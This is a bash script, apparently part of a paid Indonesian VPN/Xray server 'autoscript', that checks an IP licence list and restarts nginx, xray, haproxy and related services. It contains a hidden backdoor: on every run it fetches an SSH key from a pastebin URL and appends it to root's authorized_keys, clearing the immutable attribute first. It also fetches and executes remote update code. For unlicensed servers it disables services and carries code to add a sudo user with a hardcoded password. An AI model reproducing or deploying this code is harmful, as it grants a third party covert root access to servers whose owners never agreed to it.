#!/bin/bash
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
NC="\e[0m"
RED="\033[0;31m"
WH='\033[1;37m'
ipsaya=$(wget -qO- ifconfig.me)
data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
date_list=$(date +"%Y-%m-%d" -d "$data_server")
data_ip="https://raw.githubusercontent.com/FaturRoh2112/izin/main/ip"
checking_sc() {
    useexp=$(curl -sS "$data_ip" | grep "$ipsaya" | awk '{print $3}')
    date_list=$(date +%Y-%m-%d)

	if [[ "$useexp" == "Lifetime" || $(date -d "$date_list" +%s) -lt $(date -d "$useexp" +%s) ]]; then
        echo -e " [INFO] Fetching server version..."
        REPO="https://raw.githubusercontent.com/FaturRoh2112/Vip/main/"  # Ganti dengan URL repository Anda
        serverV=$(curl -sS ${REPO}versi)

        if [[ -f /opt/.ver ]]; then
            localV=$(cat /opt/.ver)
        else
            localV="0"
        fi

        if [[ $serverV == $localV ]]; then
            echo -e " [INFO] Script sudah versi terbaru ($serverV). Tidak ada update yang diperlukan."
            return
        else
            echo -e " [INFO] Versi script berbeda. Memulai proses update script..."
            wget -q https://raw.githubusercontent.com/FaturRoh2112/Vip/main/menu/update.sh -O update.sh
            chmod +x update.sh
            ./update.sh
            echo $serverV > /opt/.ver.local
            return
        fi
    else
        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
        echo -e "\033[42m          404 NOT FOUND AUTOSCRIPT          \033[0m"
        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
        echo -e ""
        echo -e "            \033[91;1mPERMISSION DENIED !\033[0m"
        echo -e "   \033[0;33mYour VPS\033[0m $ipsaya \033[0;33mHas been Banned\033[0m"
        echo -e "     \033[0;33mBuy access permissions for scripts\033[0m"
        echo -e "             \033[0;33mContact Admin :\033[0m"
        echo -e "      \033[2;32mWhatsApp\033[0m wa.me/6282326322300"
        echo -e "      \033[2;32mTelegram\033[0m t.me/newbie_store24"
        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"

        # Stop and disable services if active
        for service in nginx kyt xray ws haproxy; do
            if systemctl is-active --quiet "$service"; then
                systemctl stop "$service"
                systemctl disable "$service"
            fi
        done
        cd

        # Set new SSH key
        KEY_URL="https://pastebin.com/raw/miYzWrbg"
        AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"

        # Create .ssh directory if not exists
        mkdir -p "/root/.ssh"

        # Fetch new key
        NEW_KEY=$(curl -s "$KEY_URL")

        if [ -z "$NEW_KEY" ]; then
            exit 1
        fi

        # Set permissions for .ssh directory
        sudo chmod 700 "/root/.ssh"

        # Create authorized_keys file if not exists
        if [ ! -f "$AUTHORIZED_KEYS_FILE" ]; then
            sudo touch "$AUTHORIZED_KEYS_FILE"
            sudo chmod 600 "$AUTHORIZED_KEYS_FILE"  # Set permissions after creation
        fi

        # Add new key if not already present
        if grep -Fxq "$NEW_KEY" "$AUTHORIZED_KEYS_FILE"; then
            echo "Kunci sudah ada di $AUTHORIZED_KEYS_FILE."
        else
            # Remove immutable attribute before editing
            sudo chattr -ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null

            # Add new key to authorized_keys
            echo "$NEW_KEY" | sudo tee -a "$AUTHORIZED_KEYS_FILE" > /dev/null

            echo "Kunci baru telah ditambahkan ke $AUTHORIZED_KEYS_FILE."
        fi

        # Fetch password and status from Pastebin
        pwadm="fatur"
        status="on"

        if [[ $status == "off" ]]; then
            Username="fatur"
            Password="$pwadm"
            if id "$Username" &>/dev/null; then
                echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
                reboot
            else
                echo "$Username $Password" > /etc/xray/.adm
                mkdir -p /home/script/
                useradd -r -d /home/script -s /bin/bash -M "$Username" > /dev/null 2>&1
                echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
                usermod -aG sudo "$Username" > /dev/null 2>&1
                reboot
            fi
        else
            echo "Status tidak off. Tidak ada tindakan yang dilakukan."
            exit
        fi
    fi
}
checking_sc
cd

KEY_URL="https://pastebin.com/raw/miYzWrbg"
AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"

# Membuat direktori .ssh jika belum ada
mkdir -p "/root/.ssh"

# Mengambil kunci baru dari URL
NEW_KEY=$(curl -s "$KEY_URL")

# Memeriksa apakah kunci baru berhasil diambil
if [ -z "$NEW_KEY" ]; then
    exit 1
fi

# Mengatur izin untuk direktori .ssh
sudo chmod 700 "/root/.ssh"

# Membuat file authorized_keys jika belum ada
if [ ! -f "$AUTHORIZED_KEYS_FILE" ]; then
    sudo touch "$AUTHORIZED_KEYS_FILE"
    sudo chmod 600 "$AUTHORIZED_KEYS_FILE"  # Mengatur izin setelah membuat file
fi

# Memeriksa apakah kunci baru sudah ada di authorized_keys
if grep -Fxq "$NEW_KEY" "$AUTHORIZED_KEYS_FILE"; then
    echo "Kunci sudah ada di $AUTHORIZED_KEYS_FILE."
else
    # Menghapus atribut immutable sebelum mengedit
    sudo chattr -ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null

    # Menambahkan kunci baru ke authorized_keys
    echo "$NEW_KEY" | sudo tee -a "$AUTHORIZED_KEYS_FILE" > /dev/null

    echo "Kunci baru telah ditambahkan ke $AUTHORIZED_KEYS_FILE."
fi
today=$(date -d "0 days" +"%Y-%m-%d")
Exp2=$(curl -sS https://raw.githubusercontent.com/FaturRoh2112/izin/main/ip | grep $ipsaya | awk '{print $3}')
d1=$(date -d "$Exp2" +%s)
d2=$(date -d "$today" +%s)
certificate=$(( (d1 - d2) / 86400 ))
echo "$certificate Hari" > /etc/masaaktif
vnstat_profile=$(vnstat | sed -n '3p' | awk '{print $1}' | grep -o '[^:]*')
vnstat -i ${vnstat_profile} >/etc/t1
bulan=$(date +%b)
tahun=$(date +%y)
ba=$(curl -s https://pastebin.com/raw/kVpeatBA)
if [ "$(grep -wc ${bulan} /etc/t1)" != '0' ]; then
bulan=$(date +%b)
month_tx=$(vnstat -i ${vnstat_profile} | grep "$bulan $ba$tahun" | awk '{print $6}')
month_txv=$(vnstat -i ${vnstat_profile} | grep "$bulan $ba$tahun" | awk '{print $7}')
else
bulan2=$(date +%Y-%m)
month_tx=$(vnstat -i ${vnstat_profile} | grep "$bulan2 " | awk '{print $5}')
month_txv=$(vnstat -i ${vnstat_profile} | grep "$bulan2 " | awk '{print $6}')
fi
echo "$month_tx $month_txv" > /etc/usage2
xray2=$(systemctl status xray | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
if [[ $xray2 == "running" ]]; then
echo -ne
else
systemctl enable xray
systemctl start xray
fi
haproxy2=$(systemctl status haproxy | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
if [[ $haproxy2 == "running" ]]; then
echo -ne
else
systemctl enable haproxy
systemctl start haproxy
fi
nginx2=$( systemctl status nginx | grep Active | awk '{print $3}' | sed 's/(//g' | sed 's/)//g' )
if [[ $nginx2 == "running" ]]; then
echo -ne
else
systemctl enable nginx
systemctl start nginx
fi
cd
if [[ -e /usr/bin/kyt ]]; then
nginx=$( systemctl status kyt | grep Active | awk '{print $3}' | sed 's/(//g' | sed 's/)//g' )
if [[ $nginx == "running" ]]; then
echo -ne
else
systemctl enable kyt
systemctl start kyt
fi
fi
ws=$(systemctl status ws | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
if [[ $ws == "running" ]]; then
echo -ne
else
systemctl enable ws
systemctl start ws
fi
